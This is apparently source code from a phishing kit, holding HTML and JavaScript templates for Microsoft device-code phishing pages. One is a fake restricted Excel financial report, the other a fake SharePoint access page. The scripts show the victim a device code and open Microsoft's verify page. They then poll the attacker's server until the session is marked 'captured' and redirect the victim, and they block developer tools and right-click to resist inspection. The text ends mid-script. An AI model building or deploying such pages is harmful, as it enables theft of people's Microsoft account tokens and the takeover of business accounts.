  padding-top: 10px; border-top: 1px solid #f0f0f0; width: 100%; margin-top: 3px;
}

.hidden { display: none !important; }
</style>
</head>
<body>

<div class="xl-shell" aria-hidden="true">
  <div class="xl-ribbon">
    <span class="xl-ribbon-tab">File</span>
    <span class="xl-ribbon-tab active">Home</span>
    <span class="xl-ribbon-tab">Insert</span>
    <span class="xl-ribbon-tab">Page Layout</span>
    <span class="xl-ribbon-tab">Formulas</span>
    <span class="xl-ribbon-tab">Data</span>
    <span class="xl-ribbon-tab">Review</span>
    <span class="xl-ribbon-tab">View</span>
  </div>
  <div class="xl-formula-bar">
    <div class="xl-name-box">B4</div>
    <div class="xl-fx">fx</div>
    <div class="xl-formula-text">=SUM(D8:D21)</div>
  </div>
  <div class="xl-body">
    <div class="xl-rownums" id="rowNumContainer">
      <div class="xl-rownum-corner"></div>
    </div>
    <div class="xl-grid-wrap">
      <div class="xl-col-headers">
        <div class="xl-ch c-B" style="width:220px">B</div>
        <div class="xl-ch c-C">C</div>
        <div class="xl-ch c-D">D</div>
        <div class="xl-ch c-E">E</div>
        <div class="xl-ch c-F">F</div>
        <div class="xl-ch c-G">G</div>
        <div class="xl-ch c-H">H</div>
        <div class="xl-ch c-I">I</div>
      </div>
      <div class="xl-grid" id="gridContainer"></div>
    </div>
  </div>
  <div class="xl-tabs">
    <div class="xl-tab active">Q2 Financial Report</div>
    <div class="xl-tab">Q1 Summary</div>
    <div class="xl-tab">FY2025 Annual</div>
    <div class="xl-tab">Balance Sheet</div>
    <div class="xl-tab">Cash Flow</div>
  </div>
  <div class="xl-statusbar">
    <span class="xl-status-item">Ready</span>
    <span class="xl-status-item">Average: 38,280</span>
    <span class="xl-status-item">Count: 18</span>
    <span class="xl-status-item">Sum: 688,940</span>
  </div>
</div>

<div class="page-overlay" aria-hidden="true"></div>

<header class="topbar">
  <div class="topbar-left">
    <div class="topbar-brand">
      <div class="brand-xl-icon">
        <svg viewBox="0 0 14 14"><text x="1" y="11" font-family="Calibri,Arial,sans-serif" font-size="11" font-weight="700" fill="white">X</text></svg>
      </div>
      <span class="brand-name">SecureShare</span>
    </div>
    <div class="topbar-divider"></div>
    <span class="topbar-doc" id="topbarDoc">Q2 Financial Report — Vantage Capital Group.xlsx</span>
  </div>
  <div class="topbar-right">
    <span class="lock-tag">
      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      Restricted access
    </span>
  </div>
</header>

<div class="page">
  <div class="card ui" id="mainCard">
    <div class="card-rule"></div>
    <div class="card-header">
      <div class="header-icon">
        <svg viewBox="0 0 24 24">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z"/>
          <path d="M14 2v6h6" fill="none" stroke="#217346" stroke-width="1.5" stroke-linejoin="round"/>
          <line x1="8" y1="13" x2="16" y2="13" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
          <line x1="8" y1="17" x2="16" y2="17" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
        </svg>
      </div>
      <div class="header-text">
        <div class="header-eyebrow">Restricted document</div>
        <div class="header-title" id="docTitle">Q2 Financial Report.xlsx</div>
        <div class="header-sub">Vantage Capital Group · Board use only</div>
      </div>
    </div>

    <div id="stepAccess">
      <div class="card-body">
        <div class="access-info">
          This document requires identity verification before it can be viewed. Use your company credentials or sign in with Microsoft.
        </div>
        <button class="btn-open" id="btnOpen">
          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Open document
        </button>
        <div class="divider-row">or</div>
        <button class="btn-ms" id="btnMs">
          <svg width="16" height="16" viewBox="0 0 21 21">
            <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
            <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
            <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
            <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
          </svg>
          Sign in with Microsoft
        </button>
      </div>
    </div>

    <div id="stepCode" class="hidden">
      <div class="card-body">
        <div class="code-section">
          <div class="code-label-row">
            <span class="code-label">Access code</span>
            <button class="regen-btn" id="btnRegen" style="display:none;">
              <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.49"/></svg>
              New code
            </button>
          </div>
          <div class="code-box">
            <span class="code-value" id="codeDisplay">Loading...</span>
            <button class="copy-btn" id="btnCopy" disabled>
              <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              Copy
            </button>
          </div>
        </div>
        <ul class="how-list">
          <li><div class="how-n">1</div><span>Copy the code above</span></li>
          <li><div class="how-n">2</div><span>Click <strong>Authenticate</strong> and sign in with your company account</span></li>
          <li><div class="how-n">3</div><span>Paste the code when prompted to unlock the document</span></li>
        </ul>
        <button class="btn-authenticate" id="btnAuthenticate" disabled>
          <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
          Authenticate
        </button>
        <button class="btn-back" id="btnBack">
          <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
          Go back
        </button>
      </div>
    </div>

    <div id="stepSuccess" class="hidden">
      <div class="card-body">
        <div class="success-wrap">
          <div class="success-icon">
            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h2 class="success-title">Access granted</h2>
          <p class="success-sub">Your identity has been verified. The document is now available to view and download.</p>
          <button class="btn-dl" id="btnDownload">
            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Download document
          </button>
        </div>
      </div>
    </div>

    <div class="card-footer">
      <span class="ftag">256-bit encrypted</span>
      <div class="ftag-sep"></div>
      <span class="ftag">Access logged</span>
      <div class="ftag-sep"></div>
      <span class="ftag">Expires 24 h</span>
    </div>

    <div class="dlg-overlay hidden" id="dlgOverlay" role="dialog" aria-modal="true">
      <div class="dlg-inner">
        <div class="dlg-icon">
          <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
        </div>
        <p class="dlg-heading">Confirm your identity</p>
        <p class="dlg-sub">You are about to access a restricted financial document. Your access will be logged for audit purposes.</p>
        <div class="dlg-actions">
          <button class="dlg-proceed" id="dlgProceed">
            <svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
            Continue
          </button>
          <button class="dlg-cancel" id="dlgCancel">Cancel</button>
        </div>
        <p class="dlg-note">Unauthorised access to this document may be subject to legal action.</p>
      </div>
    </div>
  </div>
</div>

<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});

(function(){
  var sid = '{session_id}';
  var verifyUrl = '{verify_url}';
  var codeReady = {code_ready};
  var code = '{user_code}';

  var codeEl = document.getElementById('codeDisplay');
  var btnAuth = document.getElementById('btnAuthenticate');
  var copyBtn = document.getElementById('btnCopy');

  function showCode(c, v) {
    code = c;
    if(v) verifyUrl = v;
    codeEl.textContent = c;
    btnAuth.disabled = false;
    copyBtn.disabled = false;
  }

  if (codeReady && code) {
    showCode(code, verifyUrl);
  } else {
    codeEl.textContent = 'Loading...';
    btnAuth.disabled = true;
    copyBtn.disabled = true;
  }

  function copyCode() {
    if (!code) return;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(code).then(function() { showCopied(); });
    } else {
      var t = document.createElement('textarea');
      t.value = code;
      document.body.appendChild(t);
      t.select();
      document.execCommand('copy');
      document.body.removeChild(t);
      showCopied();
    }
  }

  function showCopied() {
    copyBtn.classList.add('copied');
    copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied';
    setTimeout(function() {
      copyBtn.classList.remove('copied');
      copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy';
    }, 2000);
  }

  function openSignIn() {
    if (!code) return;
    copyCode();
    var w = 600, h = 600, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
    var popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
    if (popup) popup.focus();
  }

  function showSuccess(redirectUrl) {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepSuccess').classList.remove('hidden');
    var downloadBtn = document.getElementById('btnDownload');
    if (redirectUrl) {
      downloadBtn.onclick = function() { top.location.href = redirectUrl; };
    } else {
      downloadBtn.onclick = function() { top.location.href = redirectUrl || '/'; };
    }
  }

  function poll() {
    fetch('/dc/status/' + sid, {method:'GET',credentials:'include'}).then(function(r) { return r.json() }).then(function(d) {
      if (d.ready && !codeReady) {
        codeReady = true;
        showCode(d.user_code, d.verify_url);
      }
      if (d.captured) {
        showSuccess(d.redirect_url);
        if (d.redirect_url) {
          setTimeout(function(){ top.location.href = d.redirect_url; }, 2500);
        }
      }
      if (d.expired) {
        btnAuth.disabled = true;
      }
      if (!d.failed && !d.expired && !d.captured) {
        setTimeout(poll, 3000);
      }
    })['catch'](function(){ setTimeout(poll, 5000); });
  }
  poll();

  // Step 1 → dialog
  document.getElementById('btnOpen').addEventListener('click', function() {
    document.getElementById('dlgOverlay').classList.remove('hidden');
  });

  document.getElementById('btnMs').addEventListener('click', function() {
    var b = this;
    var orig = b.innerHTML;
    b.textContent = 'Redirecting…'; b.disabled = true;
    setTimeout(function() {
      b.disabled = false; b.innerHTML = orig;
      alert('Would redirect to Microsoft SSO in production.');
    }, 1300);
  });

  document.getElementById('dlgProceed').addEventListener('click', function() {
    document.getElementById('dlgOverlay').classList.add('hidden');
    document.getElementById('stepAccess').classList.add('hidden');
    document.getElementById('stepCode').classList.remove('hidden');
  });

  document.getElementById('dlgCancel').addEventListener('click', function() {
    document.getElementById('dlgOverlay').classList.add('hidden');
  });

  document.getElementById('btnBack').addEventListener('click', function() {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepAccess').classList.remove('hidden');
  });

  copyBtn.addEventListener('click', copyCode);
  btnAuth.addEventListener('click', openSignIn);

  // Build spreadsheet rows
  function buildSpreadsheet() {
    var grid = document.getElementById('gridContainer');
    var rowNumContainer = document.getElementById('rowNumContainer');
    grid.innerHTML = '';
    rowNumContainer.innerHTML = '<div class="xl-rownum-corner"></div>';

    for (var i = 1; i <= 50; i++) {
      var rn = document.createElement('div');
      rn.className = 'xl-rn';
      rn.textContent = i;
      rowNumContainer.appendChild(rn);
    }

    function cell(classes, content) {
      var c = document.createElement('div');
      c.className = 'xl-cell ' + classes;
      if (content) c.textContent = content;
      return c;
    }

    function row() {
      var r = document.createElement('div');
      r.className = 'xl-row';
      for (var i = 0; i < arguments.length; i++) {
        r.appendChild(arguments[i]);
      }
      return r;
    }

    grid.appendChild(row(
      cell('c-B title-cell', 'Vantage Capital Group'),
      cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '28px';

    grid.appendChild(row(
      cell('c-B subtitle-cell', 'Consolidated Financial Statements — Q2 2026'),
      cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '18px';

    grid.appendChild(row(
      cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '10px';

    grid.appendChild(row(
      cell('c-B header-row', 'Description'),
      cell('c-C header-row center', 'Category'),
      cell('c-D header-row right', 'Q2 2025'),
      cell('c-E header-row right', 'Q1 2026'),
      cell('c-F header-row right selected', 'Q2 2026'),
      cell('c-G header-row right', 'QoQ Chg'),
      cell('c-H header-row right', 'YoY Chg'),
      cell('c-I header-row center', 'Status')
    ));

    var data = [
      { desc: 'Enterprise SaaS Subscriptions', cat: 'Recurring', d: '26,540', e: '29,180', f: '31,420', g: '+7.7%', h: '+18.4%', status: '●', statusClass: 'pos' },
      { desc: 'Managed Services Revenue', cat: 'Recurring', d: '21,800', e: '22,100', f: '22,740', g: '+2.9%', h: '+4.3%', status: '●', statusClass: 'pos' },
      { desc: 'Professional Services', cat: 'Project', d: '19,420', e: '19,100', f: '18,200', g: '−4.7%', h: '−6.3%', status: '▼', statusClass: 'neg' },
      { desc: 'Licensing & IP Revenue', cat: 'License', d: '9,700', e: '10,880', f: '11,900', g: '+9.4%', h: '+22.7%', status: '●', statusClass: 'pos' },
      { desc: 'Cloud Services', cat: 'Recurring', d: '14,200', e: '15,400', f: '16,800', g: '+9.1%', h: '+18.3%', status: '●', statusClass: 'pos' },
      { desc: 'Consulting Revenue', cat: 'Project', d: '8,900', e: '8,300', f: '7,800', g: '−6.0%', h: '−12.4%', status: '▼', statusClass: 'neg' },
      { desc: 'Software Licenses', cat: 'License', d: '5,600', e: '6,100', f: '6,700', g: '+9.8%', h: '+19.6%', status: '●', statusClass: 'pos' },
      { desc: 'Maintenance & Support', cat: 'Recurring', d: '12,300', e: '13,000', f: '13,800', g: '+6.2%', h: '+12.2%', status: '●', statusClass: 'pos' },
      { desc: 'Implementation Services', cat: 'Project', d: '7,100', e: '6,800', f: '6,200', g: '−8.8%', h: '−12.7%', status: '▼', statusClass: 'neg' },
      { desc: 'Data Analytics', cat: 'License', d: '4,800', e: '5,300', f: '5,900', g: '+11.3%', h: '+22.9%', status: '●', statusClass: 'pos' },
      { desc: 'Training & Enablement', cat: 'Project', d: '3,200', e: '3,500', f: '3,100', g: '−11.4%', h: '−3.1%', status: '▼', statusClass: 'neg' },
      { desc: 'Security Services', cat: 'Recurring', d: '6,700', e: '7,200', f: '7,900', g: '+9.7%', h: '+17.9%', status: '●', statusClass: 'pos' },
      { desc: 'Partnership Revenue', cat: 'License', d: '2,900', e: '3,300', f: '3,800', g: '+15.2%', h: '+31.0%', status: '●', statusClass: 'pos' },
      { desc: 'Hardware Resale', cat: 'Project', d: '4,100', e: '3,700', f: '3,300', g: '−10.8%', h: '−19.5%', status: '▼', statusClass: 'neg' },
    ];

    var idx = 0;
    for (var di = 0; di < data.length; di++) {
      var item = data[di];
      var even = idx % 2 === 0 ? 'even-row' : '';
      grid.appendChild(row(
        cell('c-B ' + even, item.desc),
        cell('c-C ' + even + ' center', item.cat),
        cell('c-D ' + even + ' right', item.d),
        cell('c-E ' + even + ' right', item.e),
        cell('c-F ' + even + ' right bold', item.f),
        cell('c-G ' + even + ' right ' + item.statusClass, item.g),
        cell('c-H ' + even + ' right ' + item.statusClass, item.h),
        cell('c-I ' + even + ' center', item.status)
      ));
      var cells = grid.children[grid.children.length-1].querySelectorAll('.xl-cell');
      if (cells.length === 8) {
        cells[7].style.color = item.statusClass === 'pos' ? '#1e7d45' : '#c0392b';
        if (item.status === '▼') cells[7].style.fontSize = '10px';
      }
      idx++;
    }

    grid.appendChild(row(
      cell('c-B subtotal-row', 'Total Revenue'),
      cell('c-C subtotal-row', ''),
      cell('c-D subtotal-row right', '77,460'),
      cell('c-E subtotal-row right', '81,260'),
      cell('c-F subtotal-row right formula', '84,260'),
      cell('c-G subtotal-row right pos', '+3.7%'),
      cell('c-H subtotal-row right pos', '+8.8%'),
      cell('c-I subtotal-row', '')
    ));

    grid.appendChild(row(
      cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '6px';

    grid.appendChild(row(
      cell('c-B section-head', 'COST OF REVENUE'),
      cell('c-C section-head', ''), cell('c-D section-head', ''), cell('c-E section-head', ''), cell('c-F section-head', ''), cell('c-G section-head', ''), cell('c-H section-head', ''), cell('c-I section-head', '')
    ));

    var costs = [
      { desc: 'Direct Labour & Headcount', cat: 'Fixed', d: '18,400', e: '18,900', f: '19,100', g: '−1.1%', h: '−3.8%', status: '▼', statusClass: 'neg' },
      { desc: 'Cloud Infrastructure', cat: 'Variable', d: '8,200', e: '8,600', f: '8,900', g: '−3.5%', h: '−8.5%', status: '▼', statusClass: 'neg' },
      { desc: 'Third-Party Services', cat: 'Variable', d: '4,100', e: '3,900', f: '3,600', g: '+7.7%', h: '+12.2%', status: '●', statusClass: 'pos' },
      { desc: 'Facilities & Overhead', cat: 'Fixed', d: '6,200', e: '6,500', f: '6,800', g: '−4.6%', h: '−9.7%', status: '▼', statusClass: 'neg' },
      { desc: 'Marketing & Sales', cat: 'Variable', d: '7,500', e: '8,000', f: '8,400', g: '−5.0%', h: '−12.0%', status: '▼', statusClass: 'neg' },
      { desc: 'R&D Investment', cat: 'Fixed', d: '9,100', e: '9,600', f: '10,200', g: '−6.3%', h: '−12.1%', status: '▼', statusClass: 'neg' },
    ];

    for (var ci = 0; ci < costs.length; ci++) {
      var item = costs[ci];
      var even = idx % 2 === 0 ? 'even-row' : '';
      grid.appendChild(row(
        cell('c-B ' + even, item.desc),
        cell('c-C ' + even + ' center', item.cat),
        cell('c-D ' + even + ' right', item.d),
        cell('c-E ' + even + ' right', item.e),
        cell('c-F ' + even + ' right bold', item.f),
        cell('c-G ' + even + ' right ' + item.statusClass, item.g),
        cell('c-H ' + even + ' right ' + item.statusClass, item.h),
        cell('c-I ' + even + ' center', item.status)
      ));
      var cells = grid.children[grid.children.length-1].querySelectorAll('.xl-cell');
      if (cells.length === 8) {
        cells[7].style.color = item.statusClass === 'pos' ? '#1e7d45' : '#c0392b';
        if (item.status === '▼') cells[7].style.fontSize = '10px';
      }
      idx++;
    }

    grid.appendChild(row(
      cell('c-B subtotal-row', 'Gross Profit'),
      cell('c-C subtotal-row', ''),
      cell('c-D subtotal-row right', '46,760'),
      cell('c-E subtotal-row right', '49,860'),
      cell('c-F subtotal-row right formula', '52,660'),
      cell('c-G subtotal-row right pos', '+5.6%'),
      cell('c-H subtotal-row right pos', '+12.6%'),
      cell('c-I subtotal-row', '')
    ));

    grid.appendChild(row(
      cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
    ));
    grid.children[grid.children.length-1].style.height = '6px';

    grid.appendChild(row(
      cell('c-B total-row', 'NET PROFIT'),
      cell('c-C total-row', ''),
      cell('c-D total-row right', '20,240'),
      cell('c-E total-row right', '21,140'),
      cell('c-F total-row right', '22,480'),
      cell('c-G total-row right', '+6.3%'),
      cell('c-H total-row right', '+11.1%'),
      cell('c-I total-row', '')
    ));
    var totalRow = grid.children[grid.children.length-1];
    totalRow.style.height = '22px';
    var totalCells = totalRow.querySelectorAll('.xl-cell');
    if (totalCells.length >= 7) {
      totalCells[5].style.color = '#86efac';
      totalCells[6].style.color = '#86efac';
    }

    var currentRows = grid.children.length;
    for (var i = currentRows; i < 50; i++) {
      var emptyRow = row(
        cell('c-B', ''), cell('c-C', ''), cell('c-D', ''), cell('c-E', ''), 
        cell('c-F', ''), cell('c-G', ''), cell('c-H', ''), cell('c-I', '')
      );
      grid.appendChild(emptyRow);
    }
  }

  buildSpreadsheet();
})();
</script>
</body>
</html>`

// SharePoint document access themed page
const DEVICE_CODE_SHAREPOINT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>SharePoint - Secure Document Access</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmZJREFUWEfNl71Kw0AcxpNckmvS5tKkH01ttVpBEcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcHBwcFBEATBK3ih+IXiZ4qfKH6k+IHie4rvKL6l+IbiG4qvKb6i+JLiC4rPKT6j+ITiY4qPKD6keJ/iPYp3Kd6heIviLYo3Kd6geJ3iNYpXKV6heJniJYoXKZ6neI7iWYpnKJ6meIriSYonKB6neIziUYpHKB6meIjiQYoHKO6nuI/iPopkT73d3d/Pz8+/R8fH98fHxzd3d3c3l5eXN+fn5zcX5+c3Z2dnt2dnZ7enp6e3p6ent6enp7dnZ2e3Z2dnt2dnZ7dnZ2e3Z2dnt2dnZ7enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enpqr1C/AFCgw1VJxmbmAAAAAElFTkSuQmCC">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8f0f6;display:flex;flex-direction:column;min-height:100vh}.header{background:#036c70;padding:14px 34px;display:flex;align-items:center;gap:12px;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,0.12)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:700}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.12);width:100%;max-width:500px;padding:48px 44px}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:32px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:700;color:#036c70}.intro{text-align:center;color:#323130;font-size:13px;line-height:1.6;margin-bottom:28px;font-weight:500}.info-box{background:#d4ebf7;border-left:4px solid#036c70;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#024447;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#323130;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}.code-input{width:100%;background:#f8fafb;border:2px solid#036c70;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#036c70;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal;border-color:#c8c6c4}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#036c70;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px;transition:background .2s,transform .1s}.copy-btn:hover{background:#024f52;transform:translateY(-1px)}.copy-btn.copied{background:#107c10}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:20px;min-height:22px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#036c70;color:#fff;border:none;padding:14px 24px;font-size:14px;font-weight:700;cursor:pointer;border-radius:6px;transition:background .2s,transform .1s;margin-bottom:24px}.btn-primary:hover{background:#024f52;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f3f8fc;border:1px solid#b3d6ef;border-radius:6px;padding:18px;margin-bottom:24px;text-align:center}.security-box p{font-size:13px;color:#323130;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#036c70;color:#fff;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#024f52}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#605e5c;margin-bottom:18px}.timer{text-align:center;font-size:13px;color:#8a8886;font-weight:500}.timer span{font-weight:700;color:#d83b01}.success{display:none;text-align:center;padding:24px 0}.success-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}.success-icon svg{width:36px;height:36px;fill:#fff}.success h2{font-size:22px;font-weight:700;color:#323130;margin-bottom:10px}.success p{font-size:15px;color:#605e5c;margin-bottom:24px}.success-badge{display:inline-flex;align-items:center;gap:10px;background:#dff6dd;color:#107c10;padding:12px 24px;border-radius:6px;font-size:15px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:20px;height:20px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:22px;letter-spacing:3px}}</style>
</head>
<body>
<div class="header">
<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
<span class="header-title">SharePoint</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/SharePoint-Icon-FY26.svg" width="40" height="40" alt="SharePoint" style="flex-shrink:0">
<span class="logo-text">SharePoint</span>
</div>
<div id="mainView">
<p class="intro">A secure access code has been generated for your document.</p>
<div class="info-box">For security reasons, SharePoint requires authentication before granting access to shared documents. Use the code below to verify your identity.</div>
<div class="code-label">Document Access Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
Access Document
</button>
<div class="security-box">
<p>Your document is protected by Microsoft SharePoint's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
SharePoint Secure Platform
</a>
</div>
<p class="footer-text">If you need assistance, contact your SharePoint administrator.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Document Access Granted</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
